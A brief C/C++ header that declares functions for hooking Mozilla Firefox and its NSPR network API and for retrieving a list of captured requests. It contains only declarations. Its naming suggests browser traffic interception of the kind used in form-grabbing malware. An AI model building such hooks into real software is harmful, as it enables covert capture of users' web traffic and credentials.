#ifndef FireFoxH
#define FireFoxH
//----------------------------------------------------------------------------

#include "Requests.h"

bool HookMozillaFirefox();



namespace NSPRHOOKS
{
	PRequestList GetRequests();
	bool HookNSPRApi();
}


//----------------------------------------------------------------------------
#endif


